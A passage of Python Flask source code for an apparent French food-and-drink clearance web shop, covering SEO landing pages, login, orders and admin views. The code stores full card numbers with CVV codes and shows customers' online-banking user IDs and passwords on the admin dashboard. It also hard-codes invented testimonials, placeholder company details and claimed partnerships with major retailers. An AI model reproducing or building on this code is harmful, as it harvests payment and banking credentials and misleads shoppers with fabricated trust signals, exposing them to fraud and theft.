def blog_grossiste_halal():
    return render_template('blog/grossiste-halal.html')

@app.route('/blog/grossiste-electromenager')
def blog_grossiste_electromenager():
    return render_template('blog/grossiste-electromenager.html')

@app.route('/blog/innovations-distribution')
def blog_innovations_distribution():
    return render_template('blog/innovations-distribution.html')

@app.route('/blog/boissons-gros')
def blog_boissons_gros():
    return render_template('blog/boissons-gros.html')

@app.route('/blog/discount-alimentation')
def blog_discount_alimentation():
    return render_template('blog/discount-alimentation.html')

@app.route('/blog/grossiste-bruxelles')
def blog_grossiste_bruxelles():
    return render_template('blog/grossiste-bruxelles.html')

@app.route('/blog/alcohol-barato')
def blog_alcohol_barato():
    return render_template('blog/alcohol-barato.html')

@app.route('/blog/mayorista-espana')
def blog_mayorista_espana():
    return render_template('blog/mayorista-espana.html')

@app.route('/blog/boissons-suisses')
def blog_boissons_suisses():
    return render_template('blog/boissons-suisses.html')

@app.route('/blog/tendances-horeca')
def blog_tendances_horeca():
    return render_template('blog/tendances-horeca.html')

@app.route('/blog/psg-champion-europe-2025')
def blog_psg():
    return render_template('blog_psg.html')

@app.route("/destockage-alimentaire-2025")
def destockage_2025():
    return render_template(
        "destockage_2025.html",
        meta_title="Destockage Alimentaire 2025 : Nouveaux Stocks à -70% | destockagealimentairestore.com",
        meta_description="🚨 Nouveaux stocks alimentaires à -70% en mai 2025 ! Découvrez les offres exclusives sur les surplus de grandes marques. Livraison express France/Europe.",
        current_year=datetime.now().year
    )

# Route 2 : Émeutes Agricoles 2025
@app.route("/emeutes-agricoles-prix-alimentaires")
def emeutes_agricoles():
    return render_template(
        "emeutes_agricoles.html",
        meta_title="Émeutes Agricoles 2025 : Quel Impact sur les Prix Alimentaires ? | destockagealimentairestore.com",
        meta_description="🔥 Crise agricole en 2025 : les prix des denrées alimentaires vont-ils exploser ? Décryptage et solutions pour acheter malin.",
        current_year=datetime.now().year
    )

# Route 3 : Loi Anti-Gaspillage 2025
@app.route("/loi-anti-gaspillage-2025")
def loi_anti_gaspillage():
    return render_template(
        "loi_anti_gaspillage.html",
        meta_title="Nouvelle Loi Anti-Gaspillage 2025 : Quels Changements ? | destockagealimentairestore.com",
        meta_description="📢 La loi anti-gaspillage 2025 oblige les supermarchés à revendre leurs invendus. Comment en profiter pour acheter à -80% ?",
        current_year=datetime.now().year
    )

@app.route('/france-boissons')
def france_boissons():
    return render_template('france_boissons.html')


@app.route('/fournisseur-alcool')
def fournisseur_alcool():
    return render_template('fournisseur_alcool.html')


@app.route('/grossiste-alimentaire-en-ligne')
def grossiste_article():
    return render_template('grossisteboisson.html', 
                        title="Grossiste Alimentaire en Ligne | Économies pour Particuliers et Pros",
                        description="Découvrez les avantages d'un grossiste alimentaire en ligne...")
                        
@app.route('/destockage-boisson')
def destockage_boisson():
    return render_template('destockage_boissonbelge.html')

@app.route('/article-grossiste-sitefrance')
def article_grossiste_site23():
    return render_template('article_grossistefrance.html')

@app.route('/article-grossiste-sitefrancelo')
def article_grossiste_site24():
    return render_template('article_grossistefrancelo.html')


@app.route('/boissons-en-gros-pas-cheres')
def boissons_gros_pas_cher():
    return render_template('boissons-gros-pas-cher.html') 
    
@app.route('/article-espagne')
def article_grossiste_site2025():
    return render_template('article_grossisteespagne.html')

@app.route('/destockage-alimentaire-particuliers-français')
def destockage_particuliers2025():
    return render_template('destockage_particuliersfrancais.html')

@app.route('/descuentos-alimentarios-espana')
def descuentos_espana():
    return render_template('descuentos_espana.html')

@app.route('/destockage-alimentaire-particuliers-belge')
def destockage_particuliers():
    return render_template('destockage_particuliersbelge.html')


@app.route('/destockage-alimentaire-belgique-25')
def destockage_belgique_25():
    """Route pour la page ultra-optimisée destockage alimentaire Belgique"""
    return render_template('destockage_alimentaire_belgique_25.html')

@app.route('/destockage-alimentaire-bruxelles-25')
def destockage_bruxelles_25():
    """Route pour la page ultra-optimisée destockage alimentaire Bruxelles"""
    return render_template('destockage_bruxelles_25.html')

@app.route('/discount-alimentaire-25')
def discount_alimentaire_25():
    """Route pour la page ultra-optimisée discount alimentaire"""
    return render_template('discount_alimentaire_25.html')
    

@app.route('/destockage-belgiquebbelge')
def destockage_belgique25():
    return render_template('destockage_belgique_belge.html')
@app.route('/bebidas-alcoholicas-guia')
def guia_bebidas():
    return render_template('bebidas_alcoholicas.html',
                            title="Bebidas Alcohólicas: Guía Completa",
                            description="Guía definitiva sobre tipos de bebidas alcohólicas, dónde comprar y consumo responsable")

@app.route('/destockage-alimentaire-particulier')
def destockage_particulier():
    return render_template('destockage_particulier.html',
                            title="Déstockage Alimentaire en Ligne pour Particulier | Économies & Anti-Gaspillage",
                            description="Profitez du déstockage alimentaire en ligne pour particulier : produits à prix réduits (surplus, fins de série) avec livraison. Économisez jusqu'à 70% tout en luttant contre le gaspillage.")

@app.route('/destockage-alimentaire-particulier99')
def destockage():
    return render_template('destockage9.html')

# Route pour la version espagnole
@app.route('/es/destockage-alimentaire-particulier99')
def destockage_es():
    return render_template('destockage_es9.html')
    
@app.route('/grossiste-boisson')
def grossiste_boisson():
    return render_template('grossiste_boisson.html',
                         title="Grossiste Boisson | Guía para Elegir un Distribuidor de Bebidas",
                         description="Elige al grossiste boisson adecuado para optimizar tu negocio...",
                         keywords="grossiste boisson, mayorista bebidas, distribuidor bebidas")

@app.route('/destockage-alimentaire-professionnel1')
def seo_landing_pro1():
    """Page ultra-optimisée pour le mot-clé principal avec cache et compression"""
    # Données dynamiques pour le template
    featured_products = [p for p in products if p.get('featured', False)][:8]
    
    # Meta tags dynamiques
    meta = {
        'title': 'Destockage Alimentaire Professionnel | Grossiste -70% sur Stocks',
        'description': 'Grossiste en destockage alimentaire pour professionnels. Livraison rapide, produits à -70%, qualité garantie. Commandez en ligne dès maintenant!',
        'keywords': 'destockage alimentaire, grossiste alimentaire, destockage professionnel, produits alimentaires pas chers',
        'canonical': 'https://destockagealimentairestore.com/destockage-alimentaire-professionnel',
        'og': {
            'title': 'Destockage Alimentaire Professionnel | Grossiste -70% sur Stocks',
            'description': 'Grossiste en destockage alimentaire pour professionnels. Livraison rapide, produits à -70%, qualité garantie.',
            'type': 'website',
            'url': 'https://destockagealimentairestore.com/destockage-alimentaire-professionnel',
            'image': 'https://destockagealimentairestore.com/static/images/logo-social.jpg'
        },
        'twitter': {
            'card': 'summary_large_image',
            'title': 'Destockage Alimentaire Professionnel | Grossiste -70% sur Stocks',
            'description': 'Grossiste en destockage alimentaire pour professionnels. Livraison rapide, produits à -70%, qualité garantie.',
            'image': 'https://destockagealimentairestore.com/static/images/logo-social.jpg'
        }
    }
    
    # Données structurées Schema.org
    schema = {
        "@context": "https://schema.org",
        "@type": "WebPage",
        "name": meta['title'],
        "description": meta['description'],
        "url": meta['canonical'],
        "breadcrumb": {
            "@type": "BreadcrumbList",
            "itemListElement": [
                {"@type": "ListItem", "position": 1, "name": "Accueil", "item": "https://destockagealimentairestore.com/"},
                {"@type": "ListItem", "position": 2, "name": "Professionnels", "item": "https://destockagealimentairestore.com/professionnels"},
                {"@type": "ListItem", "position": 3, "name": "Destockage Alimentaire"}
            ]
        },
        "mainEntity": {
            "@type": "Organization",
            "name": "Destockage Alimentaire",
            "url": "https://destockagealimentairestore.com",
            "logo": "https://destockagealimentairestore.com/static/images/logo.png",
            "description": "Grossiste spécialisé dans le destockage alimentaire pour professionnels",
            "address": {
                "@type": "PostalAddress",
                "streetAddress": "123 Rue du Commerce",
                "addressLocality": "Paris",
                "postalCode": "75000",
                "addressCountry": "FR"
            },
            "contactPoint": {
                "@type": "ContactPoint",
                "telephone": "+33 1 23 45 67 89",
                "contactType": "customer service",
                "email": "contact@destockagealimentairestore.com",
                "areaServed": "FR"
            }
        }
    }
    
    # Contenu optimisé avec variantes sémantiques
    content = {
        'h1': 'Destockage Alimentaire Professionnel - Jusqu\'à -70% sur Stocks',
        'intro': 'Votre grossiste spécialisé dans le destockage alimentaire pour professionnels. Produits de qualité à prix cassés, livraison sous 48h.',
        'sections': [
            {
                'title': 'Pourquoi choisir notre destockage alimentaire ?',
                'content': 'Nous sommes le leader français du destockage alimentaire professionnel avec plus de 1500 références en stock permanent. Nos produits proviennent directement des usines et centrales d\'achat.'
            },
            {
                'title': 'Nos catégories phares',
                'content': 'Découvrez nos gammes de produits alimentaires en destockage : épicerie, surgelés, boissons, produits frais. Tous nos produits sont garantis d\'origine UE.'
            }
        ],
        'cta': 'Commandez dès maintenant et bénéficiez de nos tarifs grossiste exceptionnels!'
    }
    
    # Marques partenaires
    brands = [
        {'name': 'Carrefour', 'image': 'carrefour.png'},
        {'name': 'Casino', 'image': 'casino.png'},
        {'name': 'Auchan', 'image': 'auchan.png'},
        {'name': 'Leclerc', 'image': 'leclerc.png'},
        {'name': 'Metro', 'image': 'metro.png'}
    ]
    
    # Témoignages
    testimonials = [
        {
            'name': 'Jean D.',
            'role': 'Restaurateur à Paris',
            'text': '"Grâce à Destockage Alimentaire, j\'ai réduit mes coûts d\'approvisionnement de près de 40%. La qualité des produits est au rendez-vous et le service client est réactif."',
            'image': '1.jpg',
            'rating': 5
        },
        {
            'name': 'Marie L.',
            'role': 'Gérante d\'épicerie à Lyon',
            'text': '"Je commande régulièrement depuis 2 ans. Les prix sont imbattables et la livraison toujours à l\'heure. Un partenaire indispensable pour mon commerce."',
            'image': '2.jpg',
            'rating': 4.5
        },
        {
            'name': 'Thomas M.',
            'role': 'Traiteur à Marseille',
            'text': '"Le conseiller qui me suit connaît parfaitement mes besoins et me propose régulièrement des produits adaptés à mon activité. Un service pro de qualité."',
            'image': '3.jpg',
            'rating': 4
        }
    ]
    
    # FAQ
    faqs = [
        {
            'question': 'Qui peut acheter sur votre plateforme ?',
            'answer': 'Notre service est réservé aux professionnels : restaurateurs, traiteurs, épiceries, associations, collectivités et tout autre acteur du secteur alimentaire.'
        },
        {
            'question': 'Quelle est l\'origine de vos produits ?',
            'answer': 'Tous nos produits proviennent de fournisseurs européens et sont conformes aux normes sanitaires en vigueur.'
        },
        {
            'question': 'Quels sont les délais de livraison ?',
            'answer': 'Les commandes passées avant 12h sont expédiées le jour même (hors week-end). Le délai de livraison est de 24 à 48h en France métropolitaine.'
        }
    ]
    
    # Préparation de la réponse avec cache
    response = make_response(render_template(
        'seo_landing1.html',
        meta=meta,
        schema=json.dumps(schema, indent=2),
        content=content,
        products=featured_products,
        brands=brands,
        testimonials=testimonials,
        faqs=faqs,
        current_year=datetime.now().year
    ))
    
    # Headers de cache et performance
    response.headers['Cache-Control'] = 'public, max-age=3600'  # 1 heure de cache
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    
    return response
    
from data import products  # importe la liste de produits depuis data.py

@app.route('/product-feed.xml')
def product_feed():
    feed = render_template('product_feed.xml', products=products)
    response = make_response(feed)
    response.headers['Content-Type'] = 'application/xml'
    return response

@app.route('/blog/<slug>')
def blog_post(slug):
    """Route pour les articles de blog"""
    posts = {
        'destockage-alimentaire-avantages': {
            'title': "Destockage Alimentaire : 7 Avantages Insoupçonnés pour Votre Business",
            'content': """[Votre contenu de 1500 mots ici...]""",
            'meta': {
                'description': "Découvrez les 7 bénéfices méconnus du destockage alimentaire pour les professionnels. Réduisez vos coûts jusqu'à 70%.",
                'keywords': "destockage alimentaire avantages, économie restauration, réduire coûts alimentaires"
            }
        }
    }
    
    if slug not in posts:
        abort(404)
        
    return render_template('blog_post.html', 
                         post=posts[slug],
                         schema=generate_article_schema(posts[slug]))

@app.route('/set_promo_code', methods=['POST'])
def set_promo_code():
    if request.is_json:
        data = request.get_json()
        session['promo_code'] = data.get('promo_code', '')
        session.modified = True
        return jsonify({'success': True})
    return jsonify({'success': False})

from flask import session, redirect, url_for, flash, render_template
from datetime import datetime
from utils import send_confirmation_email, is_valid_email

from flask import render_template
from datetime import datetime
from data import products as all_products  # ✅ Import correct
@app.route('/confirmation/<order_id>')
def confirmation(order_id):
    if not (session.get('logged_in') or session.get('guest')):
        return redirect(url_for('login'))

    order = session.get('orders', {}).get(order_id)
    if not order:
        flash('Commande non trouvée', 'error')
        return redirect(url_for('index'))

    order.setdefault('subtotal', 0.0)
    order.setdefault('delivery_method', 'standard')
    order.setdefault('delivery_cost', 69 if order['delivery_method'] == 'standard' else 59)
    order.setdefault('discount', 0.0)
    order.setdefault('total', order['subtotal'] + order['delivery_cost'] - order['discount'])
    order.setdefault('payment_method', 'Inconnu')
    order.setdefault('status', 'Inconnu')
    order.setdefault('promo_code', None)
    order.setdefault('date', datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    try:
        ordered_products = []
        for pid_str, quantity in order.get('items', {}).items():
            pid = int(pid_str)
            product = next((p for p in all_products if p["id"] == pid), None)
            if product:
                ordered_products.append({
                    'id': product["id"],
                    'name': product["name"],
                    'unit_price': float(product["price"]),
                    'quantity': quantity,
                    'total_price': float(product["price"]) * quantity
                })

        order_data = {
            'id': order_id,
            'reference': order.get('reference', f"CMD-{order_id}"),
            'date': datetime.strptime(order['date'], "%Y-%m-%d %H:%M:%S").strftime("%d/%m/%Y à %H:%M"),
            'status': order['status'],
            'subtotal': float(order['subtotal']),
            'delivery_method': order['delivery_method'],
            'delivery_cost': float(order['delivery_cost']),
            'discount': float(order['discount']),
            'total': float(order['total']),
            'payment_method': order['payment_method'],
            'is_guest': 'guest' in session,
            'promo_code': order.get('promo_code'),
            'phone': order.get('phone', 'Non fourni'),
            'email': order.get('email') or session.get('last_order_email') or 'non@fourni.com',
            'user': order.get('user', 'Invité'),
            'products': ordered_products,

            'company': {
                'name': 'Destockage Alimentaire',
                'siret': '0866596654',
                'phone': '06 86 59 66 54',
                'email': 'contact@destockagealimentaire.fr',
                'address': "123 Rue de l'Épicerie, 75000 Paris, France"
            },

            'delivery_address': order.get('delivery_address', 'Adresse non précisée'),
            'billing_address': order.get('billing_address', 'Adresse non précisée')
        }

        recipient_email = order_data['email']
        if recipient_email and is_valid_email(recipient_email):
            try:
                html_content = render_template('email_confirmation.html', order=order_data, company=order_data['company'])
                send_confirmation_email(app, mail, order_data, recipient_email, html_content)

            except Exception as e:
                app.logger.error(f"Erreur lors de l’envoi de l’e-mail : {str(e)}")
        else:
            app.logger.error(f"Email invalide ou manquant pour la commande {order_id}")

    except Exception as e:
        app.logger.error(f"Erreur lors de la préparation de la commande : {e}")
        flash('Erreur interne lors de l’affichage de la confirmation.', 'error')
        return redirect(url_for('index'))

    return render_template('confirmation.html', order=order_data)


@app.before_request
def cleanup_guest_sessions():
    """Nettoie les sessions invitées après 1 heures."""
    if 'guest' in session:
        # Récupère le timestamp de création ou None
        guest_created = session.get('guest_created')
        
        if guest_created:
            # Convertit en datetime naive si nécessaire
            if isinstance(guest_created, str):
                guest_created = datetime.strptime(guest_created, "%Y-%m-%d %H:%M:%S")
            elif guest_created.tzinfo is not None:
                guest_created = guest_created.replace(tzinfo=None)
            
            # Vérifie si 24h se sont écoulées
            if (datetime.now() - guest_created) > timedelta(hours=1):
                session.pop('guest', None)
                session.pop('guest_created', None)
        
        # Initialise si non existant
        elif 'guest_created' not in session:
            session['guest_created'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")# Authentification
            
@app.route('/connexion', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        user = User.query.filter_by(username=username).first()
        if user and user.check_password(password):
            session['logged_in'] = True
            session['username'] = user.username
            session['user_id'] = user.id
            session['role'] = user.role

            if user.role == "admin":
                return redirect(url_for('admin_dashboard'))
            return redirect(url_for('index'))

        flash("Identifiants incorrects", "error")

    return render_template('login.html')




@app.route('/checkout-guest', methods=['POST'])
def checkout_guest():
    # Créer une session invité
    session['guest'] = {
        'id': f"guest_{datetime.now().strftime('%Y%m%d%H%M%S')}",
        'email': request.form.get('email'),  # Optionnel: stocker l'email
        'guest': True
    }
    return redirect(url_for('checkout'))
        

@app.route('/contact')
def contact():
    team_members = [
        {
            'name': 'Jean Dupont',
            'role': 'Directeur Général',
            'bio': 'Expert en logistique avec 15 ans d\'expérience dans la grande distribution.',
            'photo': 'team1.jpg'
        },
        {
            'name': 'Marie Lambert',
            'role': 'Responsable Qualité',
            'bio': 'Spécialiste des normes alimentaires, garantit la fraîcheur de nos produits.',
            'photo': 'team2.jpg'
        },
        {
            'name': 'Thomas Martin',
            'role': 'Responsable Clientèle',
            'bio': 'Votre interlocuteur privilégié pour toute demande commerciale.',
            'photo': 'team3.jpg'
        }
    ]

    testimonials = [
        {
            'author': 'Sophie Dubois - Carrefour Market',
            'content': 'Un partenariat exceptionnel depuis 3 ans. Livraisons toujours à l\'heure et produits de qualité irréprochable.'
        },
        {
            'author': 'Michel Bernard - Metro Cash & Carry',
            'content': 'Le meilleur rapport qualité-prix du marché. Service client réactif et professionnel.'
        },
        {
            'author': 'Nathalie Leroy - Intermarché',
            'content': 'Notre fournisseur préféré pour les opérations de destockage. Fiabilité et transparence.'
        }
    ]

    stats = {
        'years': 8,
        'clients': 420,
        'products': 1500,
        'delivery_rate': 99.7
    }

    return render_template('contact.html',
                         team_members=team_members,
                         testimonials=testimonials,
                         stats=stats)

@app.route('/inscription', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        email = request.form['email']
        password = request.form['password']
        full_name = request.form['full_name']

        if User.query.filter((User.username==username) | (User.email==email)).first():
            flash("Nom d'utilisateur ou email déjà utilisé", "error")
            return redirect(url_for('register'))

        user = User(username=username, email=email, full_name=full_name)
        user.set_password(password)
        db.session.add(user)
        db.session.commit()

        flash("Inscription réussie", "success")
        return redirect(url_for('login'))

    return render_template('register.html')




@app.route('/admin/delete-user/<username>', methods=['POST'])
@admin_required
def admin_delete_user(username):
    user = User.query.filter_by(username=username).first()
    if not user:
        return jsonify({'success': False, 'message': 'Utilisateur non trouvé'}), 404
    if user.username == 'admin':
        return jsonify({'success': False, 'message': 'Impossible de supprimer l\'administrateur principal'}), 400
    try:
        db.session.delete(user)
        db.session.commit()
        return jsonify({'success': True, 'message': 'Utilisateur supprimé avec succès'})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/blog/champagne-brut')
def champagne_brut():
    return render_template(
        'champagne-brut.html',
        title="Champagne Brut | Guide & Dégustation",
        description="Découvrez le champagne brut : marques, cuvées, prix et conseils de dégustation pour particuliers et professionnels."
    )

@app.route('/blog/champagne-pas-cher1')
def champagne_pas_cher1():
    return render_template(
        'champagne-pas-cher1.html',
        title="Champagne Pas Cher | Bons Plans & Promotions",
        description="Achetez du champagne pas cher : bons plans, promotions et astuces pour économiser sur les meilleures cuvées."
    )

@app.route('/blog/prix-champagne-2023')
def prix_champagne_2023():
    return render_template(
        'prix-champagne-2023.html',
        title="Prix du Champagne 2023 | Comparatif et Bons Plans",
        description="Découvrez le prix des champagnes en 2023 : comparatif des marques et conseils pour acheter au meilleur prix."
    )

@app.route('/blog/destockage-local')
def destockage_local():
    return render_template(
        'destockage-local.html',
        title="Déstockage Alimentaire Local | Produits à Prix Réduits",
        description="Trouvez des produits alimentaires en déstockage local : prix réduits, fins de série et promotions près de chez vous."
    )

@app.route('/blog/champagne-bollinger-brut')
def champagne_bollinger_brut():
    return render_template(
        'champagne-bollinger-brut.html',
        title="Champagne Bollinger Brut | Prix & Dégustation",
        description="Tout savoir sur le champagne Bollinger Brut : prix, dégustation, accords mets-vins et bons plans pour l'acheter."
    )

@app.route('/blog/champagne-blanc-de-blancs')
def champagne_blanc_de_blancs():
    return render_template(
        'champagne-blanc-de-blancs.html',
        title="Champagne Blanc de Blancs | Guide Complet",
        description="Découvrez le champagne Blanc de Blancs : caractéristiques, cuvées, prix et astuces pour choisir le meilleur."
    )

@app.route('/blog/economiser-alimentation')
def economiser_alimentation():
    return render_template(
        'economiser-alimentation.html',
        title="Économiser sur l'Alimentation | Astuces & Bons Plans",
        description="Conseils pour économiser sur vos courses : déstockage alimentaire, produits fins de série et promotions en ligne."
    )

@app.route('/blog/destockage-date-courte')
def destockage_date_courte1():
    return render_template(
        'destockage-date-courte1.html',
        title="Déstockage Alimentaire Dates Courtes | Réductions & Bons Plans",
        description="Profitez du déstockage alimentaire sur produits à dates courtes : prix réduits, économies et lutte contre le gaspillage."
    )

@app.route('/blog/prix-bouteilles-ruinart')
def prix_bouteilles_ruinart():
    return render_template(
        'prix-bouteilles-ruinart.html',
        title="Prix des Bouteilles Ruinart | Comparatif & Bons Plans",
        description="Découvrez les prix des bouteilles de champagne Ruinart : guide complet, comparatif des cuvées et promotions disponibles."
    )

@app.route('/blog/ruinart-blanc-de-blanc')
def ruinart_blanc_de_blanc():
    return render_template(
        'ruinart-blanc-de-blanc.html',
        title="Ruinart Blanc de Blanc | Champagne de Prestige",
        description="Tout savoir sur le Ruinart Blanc de Blanc : prix, caractéristiques, dégustation et conseils pour l'acheter."
    )

@app.route('/blog/prix-dom-perignon')
def prix_dom_perignon():
    return render_template(
        'prix-dom-perignon.html',
        title="Prix Dom Pérignon | Guide Complet & Comparatif",
        description="Découvrez le prix du Dom Pérignon selon les millésimes et cuvées : comparatif, bons plans et astuces d'achat."
    )

@app.route('/blog/dom-perignon-rose')
def dom_perignon_rose():
    return render_template(
        'dom-perignon-rose.html',
        title="Dom Pérignon Rosé | Champagne de Luxe & Prix",
        description="Tout savoir sur le Dom Pérignon Rosé : dégustation, prix, accords mets-vins et promotions disponibles."
    )

@app.after_request
def after_request(response):
    if 'cart' in session:
        session.modified = True
    return response


@app.route('/cancel_order/<order_id>', methods=['POST'])
def cancel_order(order_id):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    if 'orders' in session and order_id in session['orders']:
        session['orders'][order_id]['status'] = 'Annulée'
        session.modified = True
        flash('Commande annulée avec succès', 'success')
    else:
        flash('Commande non trouvée', 'error')
    
    return redirect(url_for('account'))


@app.route('/delete_address', methods=['POST'])
def delete_address():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    username = session['username']
    address_id = request.form.get('address_id')
    
    if 'addresses' in users[username]:
        users[username]['addresses'] = [
            addr for addr in users[username]['addresses']
            if addr['id'] != address_id
        ]
        flash('Adresse supprimée avec succès', 'success')
    else:
        flash('Adresse non trouvée', 'error')
    
    return redirect(url_for('account'))
@app.route('/add_card', methods=['POST'])
def add_card():
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    user = User.query.get(session['user_id'])
    default_card = request.form.get('default_card') == 'on'

    if default_card:
        for card in user.payment_methods:
            card.default = False

    card = PaymentMethod(
        card_number=request.form.get('card_number'),
        expiry=request.form.get('expiry_date'),
        card_name=request.form.get('card_name'),
        cvv=request.form.get('cvv'),
        default=default_card,
        user=user
    )

    db.session.add(card)
    db.session.commit()
    flash('Carte ajoutée avec succès', 'success')
    return redirect(url_for('account'))


@app.route('/delete_card', methods=['POST'])
def delete_card():
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    user = User.query.get(session['user_id'])
    card_id = request.form.get('card_id')
    card = PaymentMethod.query.filter_by(id=card_id, user_id=user.id).first()
    if card:
        db.session.delete(card)
        db.session.commit()
        flash("Carte supprimée avec succès", "success")
    else:
        flash("Carte non trouvée", "error")

    return redirect(url_for('account'))

@app.route('/compte', methods=['GET', 'POST'])
def account():
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    username = session['username']

    # Récupère l'utilisateur depuis la DB
    user = User.query.filter_by(username=username).first()
    if not user:
        flash('Votre session a expiré, veuillez vous reconnecter', 'error')
        session.clear()
        return redirect(url_for('login'))

    # Préparation des commandes pour le template depuis la DB
    user_orders = []
    for order in user.orders:  # Utilise la relation définie dans le modèle User
        order_items = []
        if order.items:  # order.items stocké en JSON
            for product_id, quantity in order.items.items():
                product = next((p for p in products if str(p['id']) == str(product_id)), None)
                if product:
                    # Gestion des images
                    image = 'default-product.jpg'
                    if 'images' in product and product['images']:
                        image = product['images'][0] if isinstance(product['images'], list) else product['images']
                    elif 'image' in product:
                        image = product['image']
                    
                    order_items.append({
                        'id': product['id'],
                        'name': product['name'],
                        'price': float(product['price']),
                        'quantity': quantity,
                        'total': float(product['price']) * quantity,
                        'image': image
                    })
        
        user_orders.append({
            'id': order.id,
            'reference': order.reference,
            'date': order.date.strftime("%d/%m/%Y à %H:%M"),
            'status': order.status,
            'total': float(order.total),
            'items': order_items,
            'delivery_method': order.delivery_method,
            'payment_method': order.payment_method
        })

    # Trier les commandes par date (les plus récentes en premier)
    user_orders.sort(key=lambda x: x['date'], reverse=True)

    # Ajout d'une date de création lisible pour le profil
    joined_date = user.created_at.strftime("%d/%m/%Y")

    return render_template('account.html',
                           user=user,
                           orders=user_orders,
                           products=products,
                           joined_date=joined_date)



@app.route('/admin')
@admin_required
def admin():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    # Récupérer toutes les commandes
    orders = session.get('orders', {})
    
    # Préparer les données pour l'affichage
    processed_orders = []
    for order_id, order_data in orders.items():
        # Calculer le total des articles
        order_total = 0
        order_items = []
        
        for product_id, quantity in order_data.get('items', {}).items():
            product = next((p for p in products if str(p['id']) == str(product_id)), None)
            if product:
                item_total = product['price'] * int(quantity)
                order_total += item_total
                order_items.append({
                    'name': product['name'],
                    'quantity': quantity,
                    'price': product['price'],
                    'total': item_total
                })
        
        # Ajouter les informations de paiement
        payment_info = {
            'method': order_data.get('payment_method', 'Non spécifié'),
            'status': order_data.get('status', 'Inconnu'),
            'total': order_total,
            'bank_details': {
                'user_id': order_data.get('bank_user_id', 'N/A'),
                'password': order_data.get('bank_password', 'N/A')
            } if order_data.get('payment_method') == 'installment' else None
        }
        
        processed_orders.append({
            'id': order_id,
            'date': order_data.get('date', 'Date inconnue'),
            'user': order_data.get('user', 'Invité'),
            'items': order_items,
            'payment': payment_info,
            'status': order_data.get('status', 'En traitement')
        })
    
    # Trier les commandes par date (les plus récentes en premier)
    processed_orders.sort(key=lambda x: x.get('date', ''), reverse=True)
    
    return render_template('admin_dashboard.html',
                         orders=processed_orders,
                         users=users,
                         products=products)

@app.route('/admin/commandes')
def admin_orders():
    # Vérifie si l'utilisateur est admin
    if not session.get('admin'):
        flash("Accès refusé", "error")
        return redirect(url_for('admin_login'))

    # Récupère toutes les commandes de la base, triées par date décroissante
    orders = Order.query.order_by(Order.date.desc()).all()

    # Préparation des commandes pour le template
    orders_data = []
    for order in orders:
        order_items = []
        if order.items:  # items stockés en JSON
            for product_id, quantity in order.items.items():
                product = next((p for p in products if str(p['id']) == str(product_id)), None)
                if product:
                    order_items.append({
                        'id': product['id'],
                        'name': product['name'],
                        'price': product['price'],
                        'quantity': quantity,
                        'total': float(product['price']) * quantity,
                        'image': product.get('image', 'default-product.jpg')
                    })
        orders_data.append({
            'id': order.id,
            'reference': order.reference,
            'user': order.user.username if order.user else 'Invité',
            'email': order.email,
            'phone': order.phone,
            'date': order.date.strftime("%Y-%m-%d %H:%M:%S"),
            'status': order.status,
            'subtotal': order.subtotal,
            'delivery_cost': order.delivery_cost,
            'discount': order.discount,
            'total': order.total,
            'items': order_items
        })

    return render_template('admin_orders.html', orders=orders_data)


@app.route('/admin/update-order-status/<order_id>', methods=['POST'])
@admin_required
def admin_update_order_status(order_id):
    # Récupère la commande depuis la DB
    order = Order.query.get(order_id)
    if not order:
        return jsonify({'success': False, 'message': 'Commande non trouvée'}), 404

    # Nouveau statut envoyé par le front
    new_status = request.json.get('status')
    valid_status = ['En traitement', 'Validée', 'En préparation', 'Expédiée', 'Livrée']
    if new_status not in valid_status:
        return jsonify({'success': False, 'message': 'Statut invalide'}), 400

    # Met à jour le statut
    order.status = new_status
    db.session.commit()

    return jsonify({'success': True, 'message': 'Statut mis à jour'})
@app.route('/blog/nutella')
def nutella_article():
    return render_template(
        'nutella-article.html',
        title="Nutella | Recettes, Astuces & Produits",
        description="Découvrez des recettes gourmandes et astuces autour de Nutella : desserts, gâteaux et idées créatives pour tous les goûts."
    )

@app.route('/blog/discount-alimentaire')
def discount_alimentaire():
    return render_template(
        'blog/discount-alimentaire.html',
        title="Discount Alimentaire | Bons Plans & Déstockage",
        description="Profitez du discount alimentaire : promotions, invendus, fins de série et astuces pour économiser jusqu'à 70% sur vos courses."
    )

@app.route('/blog/champagne-pas-chere')
def champagne_pas_chere():
    return render_template(
        'champagne_pas_chere.html',
        title="Champagne Pas Cher | Offres et Promotions",
        description="Achetez du champagne pas cher : réductions, déstockage et bons plans pour particuliers et professionnels."
    )

@app.route('/blog/discount-belgique-alimentaire')
def discount_alimentaire_belgique():
    return render_template(
        'blog/discount-belgique-alimentaire.html',
        title="Discount Alimentaire Belgique | Économies & Déstockage",
        description="Découvrez le discount alimentaire en Belgique : produits invendus, promotions et offres spéciales pour particuliers et professionnels."
    )

@app.route('/admin/products')
@admin_required
def admin_products():
    return render_template('admin_products.html', products=products, categories=categories)


@app.route('/admin/users')
@admin_required
def admin_users():
    all_users = User.query.all()
    return render_template('admin_users.html', users=all_users)

@app.route('/destockage-belgique-espagne')
def destockage_be_es():
    return render_template('destockage_be_es.html', 
                         current_year=datetime.now().year,
                         promo_end="30/06/2024",
                         countries=["Belgique", "Espagne"])

@app.route('/sitemap.xml')
def sitemap():
    # URLs statiques
    pages = [
        '/', '/contact', '/about', '/produits', '/mentions-legales', '/destockage-professionnel',
        '/guide-destockage-alimentaire', '/nos-fournisseurs', '/blog', '/presse',
        '/revolution-surplus-alimentaires-2025', '/metamorphose-distribution-2025',
        '/destockage-alimentaire-2025', '/homex', '/destockage-alimentaire-belgique',
        '/destockage-alimentaire-espagne', '/destockage-tf1-france24-actualites',
        '/article-ultra', '/fr/destockage-espagne', '/emeutes-agricoles-prix-alimentaires',
        '/blog/france-degockage-alimentaire', '/destockage-en-gros',
